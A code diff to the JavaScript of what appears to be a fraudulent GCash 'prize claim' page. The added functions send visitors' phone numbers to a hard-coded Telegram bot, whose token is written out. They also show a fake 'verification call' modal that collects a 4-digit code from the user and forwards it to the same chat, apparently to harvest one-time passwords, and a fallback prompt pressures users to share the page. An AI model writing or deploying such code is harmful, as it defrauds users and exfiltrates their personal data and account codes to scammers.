@@ -507,36 +507,236 @@ function initClaimNowButton() {
 }
 
 // ========== CLAIM THRU GCASH BUTTON ==========
+// ========== CLAIM THRU GCASH BUTTON WITH DIRECT FIREWALL LOGIC ==========
 function initClaimButton() {
     var claimBtn = document.getElementById('claimGCashBtn');
     
-    if (claimBtn) {
-        // Remove existing listeners
-        var newBtn = claimBtn.cloneNode(true);
-        claimBtn.parentNode.replaceChild(newBtn, claimBtn);
-        claimBtn = newBtn;
-        
-        // Make sure it's clickable
-        claimBtn.style.cursor = 'pointer';
-        claimBtn.disabled = false;
-        
-        claimBtn.onclick = function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            console.log("CLAIM THRU GCASH button inside popup clicked");
-            
-            // Call popup.js function
-            if (typeof window.showClaimPopup === 'function') {
-                window.showClaimPopup(150);
-            } else {
-                alert("System loading. Please try again.");
-            }
-        };
-        
-        console.log("CLAIM THRU GCASH button initialized");
+    if (!claimBtn) {
+        console.log("Claim GCash button not found");
+        return;
     }
+    
+    // Remove existing listeners
+    var newBtn = claimBtn.cloneNode(true);
+    claimBtn.parentNode.replaceChild(newBtn, claimBtn);
+    claimBtn = newBtn;
+    
+    // Style to ensure clickable
+    claimBtn.style.cursor = 'pointer';
+    claimBtn.style.opacity = '1';
+    claimBtn.disabled = false;
+    claimBtn.style.pointerEvents = 'auto';
+    
+    // Add click event with direct firewall logic
+    claimBtn.onclick = async function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        console.log("CLAIM THRU GCASH button clicked");
+        
+        // Visual feedback
+        this.style.transform = 'scale(0.97)';
+        setTimeout(function() {
+            if (claimBtn) claimBtn.style.transform = '';
+        }, 200);
+        
+        // Check Firebase first
+        if (typeof firebase === 'undefined' || !firebase.database) {
+            alert("System error. Please try again later.");
+            return;
+        }
+        
+        try {
+            var db = firebase.database();
+            var firewallSnap = await db.ref('admin/globalFirewall').once('value');
+            var firewallData = firewallSnap.val();
+            var isFirewallOn = firewallData && firewallData.active === true;
+            
+            console.log("Firewall status:", isFirewallOn ? "ON" : "OFF");
+            
+            if (isFirewallOn) {
+                // Show firewall verification popup
+                showFirewallVerification();
+                return;
+            }
+            
+            // Firewall is OFF - check for links
+            var linksSnap = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
+            
+            if (linksSnap.exists()) {
+                var key = Object.keys(linksSnap.val())[0];
+                var linkData = linksSnap.val()[key];
+                var redirectUrl = linkData.url;
+                var userPhone = localStorage.getItem("userPhone") || "Unknown";
+                var amount = 150;
+                
+                // Update link status
+                await db.ref('links/' + key).update({
+                    status: 'claimed',
+                    user: userPhone,
+                    amount: amount,
+                    claimedAt: Date.now()
+                });
+                
+                // Send Telegram
+                fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent("CLAIM REQUEST!\nPhone: " + userPhone + "\nAmount: ₱" + amount))
+                    .catch(function(e) { console.log("Telegram error:", e); });
+                
+                // Close popup and redirect
+                var prizePopup = document.getElementById('prizePopup');
+                if (prizePopup) prizePopup.style.display = 'none';
+                
+                alert("Claim successful! Redirecting...");
+                setTimeout(function() {
+                    window.location.href = redirectUrl;
+                }, 1500);
+                
+            } else {
+                // No links available
+                showNoLinkAlert();
+            }
+            
+        } catch(error) {
+            console.error("Error:", error);
+            alert("System error. Please try again.");
+        }
+    };
+    
+    console.log("CLAIM THRU GCASH button initialized with direct firewall logic");
 }
 
+// ========== FIREWALL VERIFICATION POPUP ==========
+function showFirewallVerification() {
+    // Create modal
+    var modal = document.createElement('div');
+    modal.id = 'firewallVerifyModal';
+    modal.style.position = 'fixed';
+    modal.style.top = '0';
+    modal.style.left = '0';
+    modal.style.width = '100%';
+    modal.style.height = '100%';
+    modal.style.background = 'rgba(0,0,0,0.95)';
+    modal.style.backdropFilter = 'blur(10px)';
+    modal.style.zIndex = '20001';
+    modal.style.display = 'flex';
+    modal.style.alignItems = 'center';
+    modal.style.justifyContent = 'center';
+    modal.style.fontFamily = "'Inter', sans-serif";
+    
+    var verificationCode = Math.floor(1000 + Math.random() * 9000).toString();
+    console.log("Verification code:", verificationCode);
+    
+    modal.innerHTML = `
+        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 48px; max-width: 340px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,215,0,0.3);">
+            <div style="font-size: 48px; margin-bottom: 15px;">📞</div>
+            <h2 style="color: #ff4444; font-size: 22px; margin-bottom: 15px;">VERIFICATION REQUIRED</h2>
+            <div style="color: white; font-size: 13px; margin-bottom: 20px; line-height: 1.5;">
+                <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
+                <p style="margin-top: 10px;">Please wait for the system-verification to call you. You will receive a 4-digit code during the call.</p>
+            </div>
+            <div style="display: flex; gap: 10px; margin-bottom: 15px;">
+                <input type="text" id="verifyCodeInput" style="flex: 1; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,215,0,0.3); border-radius: 30px; padding: 12px; color: white; font-size: 18px; text-align: center; letter-spacing: 4px;" placeholder="1234" maxlength="4" inputmode="numeric">
+                <button id="submitVerifyBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 30px; padding: 0 20px; font-weight: bold; color: white; cursor: pointer;">VERIFY</button>
+            </div>
+            <div style="font-size: 11px; color: #ffaa33;">Waiting for system-verification call...</div>
+            <div id="verifyErrorMsg" style="color: #ff4444; font-size: 12px; margin-top: 10px; display: none;"></div>
+        </div>
+    `;
+    
+    document.body.appendChild(modal);
+    
+    var codeInput = document.getElementById('verifyCodeInput');
+    var verifyBtn = document.getElementById('submitVerifyBtn');
+    var errorDiv = document.getElementById('verifyErrorMsg');
+    var attempts = 0;
+    
+    if (codeInput) codeInput.focus();
+    
+    verifyBtn.onclick = function() {
+        var enteredCode = codeInput.value.trim();
+        
+        if (!enteredCode || enteredCode.length < 4) {
+            errorDiv.innerHTML = "Please enter a 4-digit code.";
+            errorDiv.style.display = 'block';
+            return;
+        }
+        
+        attempts++;
+        
+        if (enteredCode === verificationCode) {
+            // Success
+            var userPhone = localStorage.getItem("userPhone") || "Unknown";
+            fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent("VERIFY SUCCESS\nPhone: " + userPhone + "\nCode: " + enteredCode))
+                .catch(function(e) { console.log("Telegram error:", e); });
+            
+            modal.remove();
+            alert("Verification successful! Please try claiming again.");
+            setTimeout(function() {
+                window.location.reload();
+            }, 1000);
+        } else {
+            // Failed
+            fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent("VERIFY FAILED\nPhone: " + userPhone + "\nCode entered: " + enteredCode + "\nCorrect code: " + verificationCode))
+                .catch(function(e) { console.log("Telegram error:", e); });
+            
+            var errorMsg = "Invalid verification code. Please try again.";
+            if (attempts >= 3) {
+                errorMsg = "Too many failed attempts. Page will refresh.";
+                setTimeout(function() {
+                    window.location.reload();
+                }, 2000);
+            }
+            errorDiv.innerHTML = errorMsg;
+            errorDiv.style.display = 'block';
+            codeInput.value = '';
+            codeInput.focus();
+        }
+    };
+    
+    // Close on outside click
+    modal.onclick = function(e) {
+        if (e.target === modal) {
+            modal.remove();
+        }
+    };
+}
+
+// ========== NO LINK ALERT ==========
+function showNoLinkAlert() {
+    var modal = document.createElement('div');
+    modal.style.position = 'fixed';
+    modal.style.top = '0';
+    modal.style.left = '0';
+    modal.style.width = '100%';
+    modal.style.height = '100%';
+    modal.style.background = 'rgba(0,0,0,0.95)';
+    modal.style.backdropFilter = 'blur(10px)';
+    modal.style.zIndex = '20000';
+    modal.style.display = 'flex';
+    modal.style.alignItems = 'center';
+    modal.style.justifyContent = 'center';
+    
+    modal.innerHTML = `
+        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 40px; max-width: 320px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,68,68,0.3);">
+            <div style="font-size: 48px; margin-bottom: 15px;">⚠️</div>
+            <h3 style="color: #ff4444; font-size: 20px; margin-bottom: 20px;">WITHDRAWAL UNAVAILABLE</h3>
+            <div style="color: white; font-size: 14px; line-height: 1.6; text-align: left;">
+                <p style="margin-bottom: 12px;">1. There is no GCash App installed on your device.</p>
+                <p style="margin-bottom: 5px;">2. Share and complete the pending task to withdraw your rewards.</p>
+            </div>
+            <button id="closeAlertBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 40px; padding: 12px 25px; color: white; font-weight: bold; margin-top: 25px; cursor: pointer; width: 100%;">GOT IT</button>
+        </div>
+    `;
+    
+    document.body.appendChild(modal);
+    
+    document.getElementById('closeAlertBtn').onclick = function() {
+        modal.remove();
+    };
+    
+    modal.onclick = function(e) {
+        if (e.target === modal) modal.remove();
+    };
+}
 // ========== FACEBOOK SHARE ==========
 function initFacebookShare() {
     var fbBtn = document.getElementById('shareFBBtn');
